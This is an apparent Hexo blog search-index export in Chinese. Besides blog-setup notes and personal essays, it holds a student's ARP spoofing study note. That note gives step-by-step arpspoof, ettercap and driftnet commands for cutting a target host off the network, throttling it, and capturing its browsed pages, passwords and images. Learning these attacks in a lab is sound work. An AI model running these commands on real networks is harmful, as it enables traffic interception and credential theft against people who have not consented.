id="Hexo内部操作"><a href="#Hexo内部操作" class="headerlink" title="Hexo内部操作"></a>Hexo内部操作</h2><h3 id="写作"><a href="#写作" class="headerlink" title="写作"></a>写作</h3><p><strong>在blog文件夹里操作</strong></p><p>创建新文章</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">hexo <span class="hljs-keyword">new</span> <span class="hljs-string">&quot;文章标题&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_21-05-20.png"></p><p>还会贴心的告诉你建在哪里了</p><blockquote><p>它真的，我哭死</p></blockquote><p>之后就可以在这个文件夹里看到以“文章标题”命名的md文件，在里面修改之后再运行<code>hexo g</code>和<code>hexo s</code>就能在预览网页看到刚发的文档啦。</p><blockquote><p>这一趴无脑跟教程走没踩雷，我又活了🥳</p></blockquote><h5 id="配置环节"><a href="#配置环节" class="headerlink" title="配置环节"></a>配置环节</h5><p>配置文件[-config.yml]</p><p><code>title</code>修改网页导航栏标签</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_21-17-41.png"></p><p>让网页和GitHub联姻</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-09_21-03-45.png"></p><p><code>theme</code>改主题，直接复制主题名字就好</p><h4 id="踩坑-2"><a href="#踩坑-2" class="headerlink" title="踩坑"></a>踩坑</h4><p><code>hexo d</code>把写作部署到GitHub上，又报错啦哈哈哈</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_21-30-22.png"></p><p>万能的互联网说这个叫映射条目缩进错误，改了好几遍缩进都不对</p><p>还碰到了一个错误</p><blockquote><p>(101.1)错误的意思是第101行与前文重复，把这一行注释掉就行</p></blockquote><p>最后改成这样运行成功</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_21-49-15.png"></p><p>但是查看<a href="https://shmodifier.github.io还是不成功/">https://ShModifier.github.io还是不成功</a></p><p>后来发现我这聪明的小脑瓜把信息放错了位置🍃</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-09_21-03-45.png"></p><p>改成这样就好啦</p><hr><p>把搭博客的笔记发上来，给大家看看笑话☃️</p>]]></content>
    
    
    <categories>
      
      <category>踩坑</category>
      
    </categories>
    
    
    <tags>
      
      <tag>hexo</tag>
      
      <tag>GitHub</tag>
      
      <tag>Node</tag>
      
      <tag>Git</tag>
      
      <tag>ssh</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于ARP欺骗和ARP攻击</title>
    <link href="/2023/01/05/%E5%85%B3%E4%BA%8EARP%E6%AC%BA%E9%AA%97%E5%92%8CARP%E6%94%BB%E5%87%BB/"/>
    <url>/2023/01/05/%E5%85%B3%E4%BA%8EARP%E6%AC%BA%E9%AA%97%E5%92%8CARP%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<p>趁着寒假偷偷卷哈哈哈🤪</p><span id="more"></span><h3 id="ARP协议"><a href="#ARP协议" class="headerlink" title="ARP协议"></a>ARP协议</h3><p>地址解析协议，即ARP（Address Resolution Protocol），是根据IP地址获取物理地址的一个TCP&#x2F;IP协议。</p><blockquote><p>每一台主机都有一个arp高速缓存，里面有本局域网中的各主机和路由器的IP地址到硬件地址的映射表</p></blockquote><h4 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h4><p>主机A和主机B各自有自己的IP地址和MAC地址，在主机A与主机B通信时，ARP协议可将主机B的IP地址解析为MAC地址。</p><p>第一步：</p><p>主机A首先确定用于访问主机B的IP地址，然后主机A在自己的本地ARP缓存中检查主机B的IP地址匹配的MAC地址</p><p>第二步：</p><p>如果主机A在ARP缓存中没有找到主机B的IP映射，它将询问主机B对应的硬件地址，会将ARP请求帧广播到本地网络上的所有主机，主机A的IP地址和MAC地址都包括在ARP请求中。本地网络上的每台主机都接受到ARP请求并检查是否与自己的IP地址匹配。如果主机发现请求的IP地址以自己的IP地址不匹配，他将丢弃ARP请求。</p><p><img src="/img/%E5%85%B3%E4%BA%8EARP%E6%AC%BA%E9%AA%97%E5%92%8CARP%E6%94%BB%E5%87%BB/ARP1.png"></p><p>第三步：</p><p>主机B确定AARP请求中的IP地址于自己的IP地址匹配，并将主机A的IP地址和MAC地址映射添加到本地ARP缓存中。</p><p>第四步：</p><p>主机B将包含MAC地址的ARP回复消息直接发送到主机A</p><p><img src="/img/%E5%85%B3%E4%BA%8EARP%E6%AC%BA%E9%AA%97%E5%92%8CARP%E6%94%BB%E5%87%BB/ARP2.png"></p><p>第五步：</p><p>当主机A收到从主机B发来的ARP回复消息时，会使用主机B的IP地址和MAC地址映射更新ARP缓存。本机缓存是有生存期的，生存期结束，将再次重复上面的内容。主机B的MAC地址一旦确定，主机A就能向主机B发送IP通信了。</p><h4 id="命令窗口玩转ARP"><a href="#命令窗口玩转ARP" class="headerlink" title="命令窗口玩转ARP"></a>命令窗口玩转ARP</h4><p>输入<code>arp</code>提示使用方法</p><p><img src="/img/%E5%85%B3%E4%BA%8EARP%E6%AC%BA%E9%AA%97%E5%92%8CARP%E6%94%BB%E5%87%BB/Snipaste_2023-01-04_18-08-45.png"></p><blockquote><p>这里一开始总是说“’ARP’不是可执行的程序”，凭我踩坑经验知道这是环境变量的问题。费尽千辛万苦发现是因为我的环境变量里居然没有system32🥲。但是输入path查看是有它的，不知道哪里出了问题，加上之后重启就好啦</p></blockquote><p>输入<code>arp -a</code>查看ARP缓存表信息</p><p><img src="/img/%E5%85%B3%E4%BA%8EARP%E6%AC%BA%E9%AA%97%E5%92%8CARP%E6%94%BB%E5%87%BB/Snipaste_2023-01-04_18-09-19.jpg"></p><p><strong>静态</strong>地址即主机自己配置生成的地址。</p><p>当主机新连接入一台设备，并且与主机产生通信后，aqp表会更新一条<strong>动态</strong>地址。</p><h3 id="ARP攻击"><a href="#ARP攻击" class="headerlink" title="ARP攻击"></a>ARP攻击</h3><p>ARP攻击就是通过伪造IP地址和MAC地址的对应关系，使得网络无法正常通信。即修改靶机的IP地址和MAC地址，使其他设备与靶机的通信无法正常进行，进而截断靶机流量。</p><blockquote><p>可以直接使用arpspoof插件攻击</p></blockquote><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">sudo arpspoof -<span class="hljs-selector-tag">i</span> eth0  -t <span class="hljs-selector-attr">[目标IP]</span> -r <span class="hljs-selector-attr">[网关]</span><br></code></pre></td></tr></table></figure><p>这里”r”的用法没搞懂😣好像就是直接双向攻击</p><p>Ctrl+C或关闭终端即停止攻击</p><h3 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h3><p><del>听说ARP欺骗配合DNS欺骗效果更佳</del>🤨</p><h5 id="可以用来干的坏事"><a href="#可以用来干的坏事" class="headerlink" title="可以用来干的坏事"></a>可以用来干的坏事</h5><ul><li>获取浏览图片</li><li>获取靶机各平台输入的账号密码</li><li>获取浏览地址</li></ul><h5 id="行骗方法"><a href="#行骗方法" class="headerlink" title="行骗方法"></a>行骗方法</h5><h6 id="1-伪装成网关"><a href="#1-伪装成网关" class="headerlink" title="1.伪装成网关"></a>1.伪装成网关</h6><p>欺骗源把自己伪装成网关，向局域网内的目标主机发送ARP报文，使得局域网内的主机误以为欺骗源的MAC地址是网关MAC地址，并将原本应该流向网关的数据都发送到欺骗源。</p><blockquote><p>直接对靶机实施ARP欺骗</p></blockquote><h6 id="2-伪装成主机"><a href="#2-伪装成主机" class="headerlink" title="2.伪装成主机"></a>2.伪装成主机</h6><p>用来欺骗局域网内的其他所有主机</p><p>欺骗源将自己伪装成局域网内的另一台主机3，将主机3的IP地址对应的MAC地址替换为欺骗元的IP地址对应的MAC地址使得局域网内靶机发往主机3的报文都流向欺骗源</p><blockquote><p>分别对网关和靶机实施ARP欺骗</p></blockquote><h3 id="操作步骤（行骗步骤）"><a href="#操作步骤（行骗步骤）" class="headerlink" title="操作步骤（行骗步骤）"></a>操作步骤<del>（行骗步骤）</del></h3><blockquote><p>伪装成网关</p></blockquote><p>首先查看欺骗源和靶机的IP地址</p><ul><li><p>直接查看：kali命令窗口输入<code>ifconfig</code>，Windows命令窗口输入<code>ipconfig</code></p></li><li><p>正经方法：</p><p>1.在kali命令窗口输入<code>fping -g xxx.xxx.xxx[网络号码].1/24</code>查询目标网络下的所有主机IP </p><p>2.输入命令<code>nmap -sP xxx.xxx.xxx[网络号码].0/24</code>查询目标网络下的所有主机IP</p></li></ul><p>输入命令<code>route-n</code>查看网关</p><p>使用arpspoof行骗</p><blockquote><p>kali命令窗口输入sudo arpspoof -h查看已经安装的arpspoof版本号，如果未安装，系统会弹出提示，按照提示安装即可 </p></blockquote><p>断网操作</p><p>把靶机发出的请求接受到攻击源主机，因为linux默认ip_forward为0，即不进行流量转发，所以靶机会断网</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">让靶机认为攻击源为网关：<br>sudo arpspoof -<span class="hljs-selector-tag">i</span> <span class="hljs-selector-attr">[网卡]</span> -t <span class="hljs-selector-attr">[目标IP]</span> <span class="hljs-selector-attr">[网关]</span><br></code></pre></td></tr></table></figure><p>或者反向欺骗</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">让网关认为攻击源是靶机：<br>sudo arpspoof -<span class="hljs-selector-tag">i</span> <span class="hljs-selector-attr">[网卡]</span> -t <span class="hljs-selector-attr">[网关]</span> <span class="hljs-selector-attr">[目标IP]</span><br></code></pre></td></tr></table></figure><blockquote><p>网卡默认eth0</p></blockquote><p><img src="/img/%E5%85%B3%E4%BA%8EARP%E6%AC%BA%E9%AA%97%E5%92%8CARP%E6%94%BB%E5%87%BB/Snipaste_2023-01-05_23-10-21.jpg"></p><p><code>cat /proc/sys/net/ipv4/ip_forward </code>查看ip_forward的值。如果ip_forward为0，则被攻击主机不能上网；如果ip_forward为1，则被攻击主机可以上网</p><p>修改数值让他上网</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">echo <span class="hljs-number">1</span> &gt; <span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/net/i</span>pv4/ip_forward<br></code></pre></td></tr></table></figure><blockquote><p>权限不够就<code>sudo -i</code> 使用root权限改</p></blockquote><p>限制网速</p><p>可以使用的工具有tc、iptables、WonderShaper等等，</p><p>以tc为例<del>本菜鸡还没学会后两个</del>😢：</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs maxima">限制网速200ms延时<br>sudo tc qdisc add dev eth0 root netem <span class="hljs-built_in">delay</span> 200ms<br> <br>取消限制网速200ms延时<br>sudo tc qdisc <span class="hljs-built_in">del</span> dev eth0 root netem <span class="hljs-built_in">delay</span> 200ms<br></code></pre></td></tr></table></figure><p>拦截数据—获取浏览网页及账号密码</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">ettercap -Tq -<span class="hljs-selector-tag">i</span> <span class="hljs-selector-attr">[网卡]</span><br></code></pre></td></tr></table></figure><p>嗅探图片</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">driftnet  -<span class="hljs-selector-tag">i</span> <span class="hljs-selector-attr">[网卡]</span><br></code></pre></td></tr></table></figure><hr><h3 id="工具说明书"><a href="#工具说明书" class="headerlink" title="工具说明书"></a>工具说明书</h3><p>因为各种工具的使用说明都是英文的，所以直接利用万能的互联网搜了一下中文的使用指南：</p><h5 id="driftnet"><a href="#driftnet" class="headerlink" title="driftnet"></a>driftnet</h5> <figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs css">语法： driftnet   <span class="hljs-selector-attr">[options]</span>   <span class="hljs-selector-attr">[filter code]</span><br><br> -<span class="hljs-selector-tag">b</span>  捕获到新的图片时发出嘟嘟声<br> -<span class="hljs-selector-tag">i</span>  interface     选择监听接口<br> -f  file   读取一个指定pcap数据包中的图片<br> -<span class="hljs-selector-tag">p</span>  不让所监听的接口使用混杂模式<br> -<span class="hljs-selector-tag">a</span>  后台模式：将捕获的图片保存到目录中（不会显示在屏幕上）<br> -m  number 指定保存图片数的数目<br> -d  directory  指定保存图片的路径<br> -x  prefix  指定保存图片的前缀名<br></code></pre></td></tr></table></figure><h5 id="arpspoof"><a href="#arpspoof" class="headerlink" title="arpspoof"></a>arpspoof</h5><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs markdown">名字 <br><span class="hljs-code">       arpspoof - 截获交换局域网中的数据包</span><br><span class="hljs-code"></span><br>用法<br><span class="hljs-code">       arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host</span><br><span class="hljs-code"></span><br>描述<br><span class="hljs-code">       arpspoof通过伪造的ARP响应包改变局域网中从目标主机（或所有主机）到另一个主机（host）的数据包转发路径。这是交换局域网中嗅探网络流量的一种极为有效的方法。</span><br><span class="hljs-code">       内核IP转发（或如fragrouter这样的、用户层面的、能完成同样功能的软件）必须提前开启。</span><br><span class="hljs-code"></span><br>参数<br><span class="hljs-code">       -i interface</span><br><span class="hljs-code">              指定要使用的接口（即指定一块网卡）</span><br><span class="hljs-code"></span><br><span class="hljs-code">       -c own|host|both</span><br><span class="hljs-code">              指定在恢复ARP配置时使用的硬件地址；当在清理（cleaning up）时，数据包的源地址可以用自己的也可以用主机（host）的硬件地址。</span><br><span class="hljs-code">              使用伪造的硬件地址可能导致某些配置下的交换网络、AP网络或桥接网络通信中断，然而它比起默认值————使用自己的硬件地址要工作地更为可靠。</span><br><span class="hljs-code"></span><br><span class="hljs-code">       -t target</span><br><span class="hljs-code">              指定一个特殊的、将被ARP毒化的主机（如果没有指定，则认为是局域网中所有主机）。重复可以指定多个主机。</span><br><span class="hljs-code"></span><br><span class="hljs-code">       -r     毒化两个主机（目标和主机（host））以捕获两个方向的网络流量。（仅仅在和-t参数一起使用时有效）</span><br><span class="hljs-code"></span><br><span class="hljs-code">       host   host是你想要截获数据包的主机 (通常是网关)。</span><br><span class="hljs-code"></span><br></code></pre></td></tr></table></figure><h5 id="ettercap"><a href="#ettercap" class="headerlink" title="ettercap"></a>ettercap</h5><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">i</span>后面跟着连接局域网的网卡<br>T指的是text文本模式<br><span class="hljs-selector-tag">q</span>以安静模式执行这个命令<br>M指定攻击模式<br>&gt;&gt;输出文件<br></code></pre></td></tr></table></figure><hr><p>发个笔记上来不然这个博客真的成碎碎念专栏了😶‍🌫️</p><p>我就是个菜鸡🍃</p>]]></content>
    
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>ARP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>年终总结</title>
    <link href="/2022/12/29/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
    <url>/2022/12/29/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p>想好怎样告别2022了吗？🥰</p><span id="more"></span><p>我总是喜欢在年末给未来一年的自己留下祝福，今年还是像往年一样的套路：希望2023的自己可以更洒脱、更自由。</p><p>过去的一年，我来到了梦寐以求的十八岁。我从被囚禁在应试教育中的高中生变成了悠闲又忙碌的大学生；我考出了驾照、学会了弹吉他；我第一次离开了父母、远离家乡，开始住宿生活；我了解到不同的世界，看到了新的风景。</p><p>过去的一年，我和很多人相遇，也和很多人告别。</p><p>这几天我想为自己挑选年度九图，于是乎我翻出了网盘里属于高中的文件夹。毕竟就在上半年，我还是一个被豢养的高考金丝雀。我打开看，里面盛满了我高三那年用老古董相机定格的青春热血。文件夹里有学校里盛开的花，阳光下惬意的猫，还有数不清的意气风发的少年。还记得，晦涩而又灿烂的高三，每天晚自习的最后半小时，我都没有向老师家长叮嘱的那般抓紧时间背单词、写大题，我把时间用来在本子上记录我的喜怒哀乐，书写我对这段时光的不舍与留恋。高中毕业，我攒了三本日记加一本随笔。</p><p>我仍记得毕业那场分别，我们背着书包，像平常那样说着再见。我和朋友们没有轰轰烈烈的告别，只有在耳边吹过的炎热又潮湿的晚风，和窗外的喧闹不止的蝉鸣。我将记录随笔的本子带到了大学，却未曾在上面写下一个文字。我只是一次又一次的翻开它，当作大学生活中的乐趣，去重温那段兵荒马乱而又潇洒肆意的时光。就像我在本子里写下的第一段话——“我所记录的每一个文字，都是过去的我对未来的赠礼”。</p><p>四个月的大学好像电影胶卷，被机器拉扯着，在我眼前一闪而过，但是这条路上仍然有精彩的风景。我遇到了新的朋友，和他们分享不同的幸福。全新的生活并不没有让我感到不安，或许是骨子里的积极勇敢，异或许是身边伙伴的鼓励陪伴，让我的这段新的旅程总是平稳畅通的。从学期初的擒敌拳，到学会的投篮捡漏技巧，还有为了交作业尝试的改源码的歪门邪道，再到期末临走前夜获得的羽毛球耍帅技巧······这些奇奇怪怪的技能背后，都有一群我非常感谢相遇相识的人。我还是个喜欢收集物料的人，宿舍书桌上的软木板，钉着我的第一张献血证书，贴着我第一次部门破冰会议的卡片，框架边缘里夹还有临走时收到的新年贺卡······这些物件承载的故事总能在回忆里熠熠生辉。</p><p>在夜深时分，我经常会把这些碎片从记忆深处拎出来，把他们拼凑成完整的拼图。</p><p><del>好吧，我承认自己总是活在回忆里。</del></p><p>最后，感谢2022，让我遇到了意趣相投的人，也让我拥有滚烫而又热烈的记忆。</p><p>新的一年，愿我所爱，平安顺遂。🎆</p>]]></content>
    
    
    <categories>
      
      <category>碎碎念</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>乐园入场券</title>
    <link href="/2022/12/10/%E4%B9%90%E5%9B%AD%E5%85%A5%E5%9C%BA%E5%88%B8/"/>
    <url>/2022/12/10/%E4%B9%90%E5%9B%AD%E5%85%A5%E5%9C%BA%E5%88%B8/</url>
    
    <content type="html"><![CDATA[<p>这是一张乐园入场券</p><span id="more"></span><p>恭喜你发现了宝藏！</p><p>成功搭建这个博客这是我上大学以来做过最有成就感的事。虽然过程中踩了很多坑，但感谢我没有放弃，才有了现在这个属于我的小小极乐世界。</p><p>这里是一个Modifier的备忘仓库，也有很多未知宝藏。</p><hr><p>最近在不停地修改我的文章，尽可能的把文章写得简洁明了。</p><p>一些很基础的东西也发上来，一是想记录自己的学习历程，二是想着，等到哪天我的文章也有人看了，能让人一下子就能看得明白。</p><hr><p>如果你看到了这里，那就祝你在Modifier的极乐世界里享受自由与快乐吧！</p>]]></content>
    
    
    <categories>
      
      <category>碎碎念</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
